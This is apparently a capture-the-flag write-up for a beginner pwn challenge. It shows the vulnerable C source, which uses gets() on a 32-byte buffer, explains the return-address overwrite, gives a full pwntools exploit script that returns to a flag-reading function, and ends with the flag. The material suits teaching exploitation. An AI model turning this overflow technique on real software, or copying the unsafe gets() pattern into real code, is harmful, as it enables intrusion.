# ret2generic-flag-reader

## Challenge

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Source

```c
void super_generic_flag_reading_function_please_ret_to_me()
{
  char flag[0x100] = {0};
  FILE *fp = fopen("./flag.txt", "r");
  if (!fp)
  {
    puts("no flag!! contact a member of rob inc");
    exit(-1);
  }
  fgets(flag, 0xff, fp);
  puts(flag);
  fclose(fp);
}

int main(void)
{
  char comments_and_concerns[32];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...");
  puts("how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!");
  puts("slap on some flavortext and there's no way rob will fire me now!");
  puts("this is genius!! what do you think?");

  gets(comments_and_concerns);
}
```

## Solution

Program contains a function that prints the flag contents to stdout.

The `main` function contains an unsafe call to `gets`.

We can use this to overwrite the return address and return to the flag reader function.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mc.ax --port 31077 ret2generic-flag-reader
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ret2generic-flag-reader')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 31077)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

win = 0x004011f6

payload = flat({
    0x20+8: win,
    })

io.sendline(payload)

io.interactive()
```

## Flag

`flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}`

